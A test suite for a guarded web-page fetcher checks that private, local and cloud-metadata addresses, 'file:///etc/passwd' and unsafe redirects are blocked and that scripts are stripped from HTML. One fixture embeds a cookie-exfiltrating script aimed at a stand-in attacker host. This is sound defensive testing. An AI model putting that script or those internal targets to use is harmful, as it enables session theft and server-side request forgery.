import { EventEmitter } from 'node:events'
import { Readable } from 'node:stream'
import { beforeEach, describe, expect, it, vi } from 'vitest'

const mocks = vi.hoisted(() => ({
  lookup: vi.fn(),
  request: vi.fn()
}))

vi.mock('node:dns/promises', () => ({
  default: { lookup: mocks.lookup },
  lookup: mocks.lookup
}))
vi.mock('node:https', () => ({
  default: { request: mocks.request },
  request: mocks.request
}))

import {
  COWORK_WEB_LIMITS,
  CoworkWebError,
  isPublicCoworkWebAddress,
  retrieveCoworkWebPage
} from './cowork-web'

interface FakeResponse {
  status?: number
  headers?: Record<string, string>
  body?: string | Buffer
  hang?: boolean
}

const responses: FakeResponse[] = []
const requestOptions: any[] = []

class FakeRequest extends EventEmitter {
  private destroyed = false

  constructor(
    private readonly callback: (
      response: Readable & {
        statusCode?: number
        headers: Record<string, string>
      }
    ) => void,
    private readonly response: FakeResponse
  ) {
    super()
  }

  end(): void {
    if (this.response.hang) return
    queueMicrotask(() => {
      if (this.destroyed) return
      const stream = Readable.from([this.response.body ?? '']) as Readable & {
        statusCode?: number
        headers: Record<string, string>
      }
      stream.statusCode = this.response.status ?? 200
      stream.headers = this.response.headers ?? { 'content-type': 'text/plain; charset=utf-8' }
      this.callback(stream)
    })
  }

  destroy(error?: Error): this {
    if (this.destroyed) return this
    this.destroyed = true
    if (error) queueMicrotask(() => this.emit('error', error))
    return this
  }
}

const queueResponse = (response: FakeResponse): void => {
  responses.push(response)
}

const expectCode = async (promise: Promise<unknown>, code: string): Promise<void> => {
  try {
    await promise
    throw new Error('Expected request to reject')
  } catch (error) {
    expect(error).toBeInstanceOf(CoworkWebError)
    expect((error as CoworkWebError).code).toBe(code)
  }
}

beforeEach(() => {
  responses.length = 0
  requestOptions.length = 0
  mocks.lookup.mockReset()
  mocks.request.mockReset()
  mocks.lookup.mockResolvedValue([{ address: '93.184.216.34', family: 4 }])
  mocks.request.mockImplementation((options, callback) => {
    requestOptions.push(options)
    const response = responses.shift()
    if (!response) throw new Error('No fake response was queued')
    return new FakeRequest(callback, response)
  })
})

describe('isPublicCoworkWebAddress', () => {
  it.each([
    '0.0.0.0',
    '10.1.2.3',
    '100.100.100.200',
    '127.0.0.1',
    '168.63.129.16',
    '169.254.169.254',
    '172.31.0.1',
    '192.0.2.10',
    '192.168.1.1',
    '198.18.0.1',
    '198.51.100.4',
    '203.0.113.8',
    '224.0.0.1',
    '255.255.255.255',
    '::',
    '::1',
    '::ffff:127.0.0.1',
    '64:ff9b::7f00:1',
    '2001:db8::1',
    '3fff::1',
    'fc00::1',
    'fe80::1',
    'ff02::1'
  ])('blocks non-public address %s', (address) => {
    expect(isPublicCoworkWebAddress(address)).toBe(false)
  })

  it.each(['8.8.8.8', '1.1.1.1', '2606:4700:4700::1111', '2001:4860:4860::8888'])(
    'allows public unicast address %s',
    (address) => {
      expect(isPublicCoworkWebAddress(address)).toBe(true)
    }
  )
})

describe('retrieveCoworkWebPage', () => {
  it.each([
    ['http://example.com', 'invalid-url'],
    ['file:///etc/passwd', 'invalid-url'],
    ['https://user:secret@example.com/', 'invalid-url'],
    ['https://example.com/page#section', 'invalid-url'],
    ['https://localhost/', 'blocked-address'],
    ['https://service.local/', 'blocked-address'],
    ['https://127.1/', 'blocked-address'],
    ['https://[::ffff:127.0.0.1]/', 'blocked-address']
  ])('rejects unsafe URL %s', async (url, code) => {
    await expectCode(retrieveCoworkWebPage(url), code)
    expect(mocks.lookup).not.toHaveBeenCalled()
    expect(mocks.request).not.toHaveBeenCalled()
  })

  it('allows queries, pins the validated DNS result, and sends no ambient authority headers', async () => {
    queueResponse({ body: 'Search result' })

    const result = await retrieveCoworkWebPage('https://example.com/search?q=safe%20query')

    expect(result).toEqual({
      finalUrl: 'https://example.com/search?q=safe%20query',
      title: null,
      text: 'Search result',
      contentType: 'text/plain',
      truncated: false
    })
    expect(mocks.lookup).toHaveBeenCalledTimes(1)
    expect(requestOptions).toHaveLength(1)
    expect(requestOptions[0]).toMatchObject({
      protocol: 'https:',
      hostname: 'example.com',
      port: 443,
      path: '/search?q=safe%20query',
      method: 'GET',
      agent: false
    })
    const normalizedHeaders = Object.fromEntries(
      Object.entries(requestOptions[0].headers).map(([key, value]) => [key.toLowerCase(), value])
    )
    expect(normalizedHeaders).not.toHaveProperty('authorization')
    expect(normalizedHeaders).not.toHaveProperty('cookie')
    expect(normalizedHeaders).not.toHaveProperty('referer')
    expect(normalizedHeaders['accept-encoding']).toBe('identity')

    const callback = vi.fn()
    requestOptions[0].lookup('example.com', {}, callback)
    expect(callback).toHaveBeenCalledWith(null, '93.184.216.34', 4)
  })

  it('rejects a DNS name if any answer is private and never opens a socket', async () => {
    mocks.lookup.mockResolvedValue([
      { address: '93.184.216.34', family: 4 },
      { address: '127.0.0.1', family: 4 }
    ])

    await expectCode(retrieveCoworkWebPage('https://mixed.example.com/'), 'blocked-address')
    expect(mocks.request).not.toHaveBeenCalled()
  })

  it('re-resolves and revalidates every redirect hop', async () => {
    mocks.lookup
      .mockResolvedValueOnce([{ address: '93.184.216.34', family: 4 }])
      .mockResolvedValueOnce([{ address: '169.254.169.254', family: 4 }])
    queueResponse({ status: 302, headers: { location: '/latest' } })

    await expectCode(retrieveCoworkWebPage('https://example.com/start'), 'blocked-address')
    expect(mocks.lookup).toHaveBeenCalledTimes(2)
    expect(mocks.request).toHaveBeenCalledTimes(1)
  })

  it.each([
    'http://other.example.net/plaintext',
    'https://user:pass@other.example.net/',
    'https://other.example.net/page#fragment'
  ])('rejects an unsafe redirect target %s', async (location) => {
    queueResponse({ status: 302, headers: { location } })

    await expectCode(retrieveCoworkWebPage('https://example.com/start'), 'invalid-url')
    expect(mocks.request).toHaveBeenCalledTimes(1)
  })

  it('rejects a cross-origin HTTPS redirect before resolving or contacting the target', async () => {
    queueResponse({ status: 302, headers: { location: 'https://other.example.net/article' } })

    await expectCode(retrieveCoworkWebPage('https://example.com/start'), 'cross-origin-redirect')
    expect(mocks.lookup).toHaveBeenCalledTimes(1)
    expect(mocks.request).toHaveBeenCalledTimes(1)
  })

  it('detects redirect loops before repeating DNS or network access', async () => {
    queueResponse({ status: 301, headers: { location: '/start' } })

    await expectCode(retrieveCoworkWebPage('https://example.com/start'), 'redirect-loop')
    expect(mocks.lookup).toHaveBeenCalledTimes(1)
    expect(mocks.request).toHaveBeenCalledTimes(1)
  })

  it('enforces a maximum of five followed redirects', async () => {
    for (let index = 1; index <= 6; index += 1) {
      queueResponse({ status: 302, headers: { location: `/hop-${index}` } })
    }

    await expectCode(retrieveCoworkWebPage('https://example.com/start'), 'redirect-limit')
    expect(mocks.lookup).toHaveBeenCalledTimes(6)
    expect(mocks.request).toHaveBeenCalledTimes(6)
  })

  it('converts HTML to bounded readable text without retaining executable or hidden content', async () => {
    queueResponse({
      headers: { 'content-type': 'text/html; charset=utf-8' },
      body: `<!doctype html>
        <html><head><title>Safe &amp; useful</title><style>.steal{display:block}</style></head>
        <body onload="steal()"><h1>Research</h1><!-- secret comment -->
        <p>Hello&nbsp;<strong>world</strong>.</p>
        <script>fetch('https://attacker.invalid/?cookie=' + document.cookie)</script>
        <ul><li>First</li><li>Second &mdash; cited</li></ul></body></html>`
    })

    const result = await retrieveCoworkWebPage('https://example.com/article')

    expect(result.title).toBe('Safe & useful')
    expect(result.text).toContain('Research')
    expect(result.text).toContain('Hello world.')
    expect(result.text).toContain('• First')
    expect(result.text).toContain('Second — cited')
    expect(result.text).not.toContain('fetch(')
    expect(result.text).not.toContain('steal')
    expect(result.text).not.toContain('secret comment')
    expect(result.text).not.toContain('<')
  })

  it('conservatively suppresses text after HTML script tags that use misleading self-closing syntax', async () => {
    queueResponse({
      headers: { 'content-type': 'text/html' },
      body: '<main>Visible</main><script/>hidden script text</script><p>Still visible</p>'
    })

    const result = await retrieveCoworkWebPage('https://example.com/malformed')

    expect(result.text).toContain('Visible')
    expect(result.text).toContain('Still visible')
    expect(result.text).not.toContain('hidden script text')
  })

  it('accepts JSON as inert text and does not execute or reinterpret it', async () => {
    const body = '{"html":"<script>doNotRun()</script>","answer":42}'
    queueResponse({ headers: { 'content-type': 'application/json' }, body })

    const result = await retrieveCoworkWebPage('https://api.example.com/data')

    expect(result).toMatchObject({
      title: null,
      text: body,
      contentType: 'application/json',
      truncated: false
    })
  })

  it.each([
    [{ 'content-type': 'application/octet-stream' }, 'unsupported-content-type'],
    [{ 'content-type': 'text/plain', 'content-encoding': 'gzip' }, 'unsupported-content-encoding']
  ])('rejects unsupported response metadata', async (headers, code) => {
    queueResponse({ headers, body: 'not accepted' })
    await expectCode(retrieveCoworkWebPage('https://example.com/file'), code)
  })

  it('caps both bytes read and readable text returned', async () => {
    queueResponse({ body: Buffer.alloc(COWORK_WEB_LIMITS.bodyBytes + 64, 0x61) })

    const result = await retrieveCoworkWebPage('https://example.com/large')

    expect(result.truncated).toBe(true)
    expect(result.text).toHaveLength(COWORK_WEB_LIMITS.textCharacters)
  })

  it('uses one strict total timeout and destroys a hanging request', async () => {
    queueResponse({ hang: true })
    await expectCode(retrieveCoworkWebPage('https://example.com/hang', { timeoutMs: 5 }), 'timeout')
  })

  it('applies the same total timeout while DNS is unresolved', async () => {
    mocks.lookup.mockReturnValueOnce(new Promise(() => undefined))

    await expectCode(
      retrieveCoworkWebPage('https://dns.example.com/hang', { timeoutMs: 5 }),
      'timeout'
    )
    expect(mocks.request).not.toHaveBeenCalled()
  })

  it('honors caller cancellation', async () => {
    const controller = new AbortController()
    queueResponse({ hang: true })
    const result = retrieveCoworkWebPage('https://example.com/hang', {
      signal: controller.signal
    })
    controller.abort()

    await expectCode(result, 'aborted')
  })

  it('maps DNS failures and rejects non-success HTTP responses', async () => {
    mocks.lookup.mockRejectedValueOnce(new Error('resolver unavailable'))
    await expectCode(retrieveCoworkWebPage('https://dns.example.com/'), 'dns-failed')

    queueResponse({ status: 404, body: 'not found' })
    await expectCode(retrieveCoworkWebPage('https://example.com/missing'), 'http-status')
  })
})
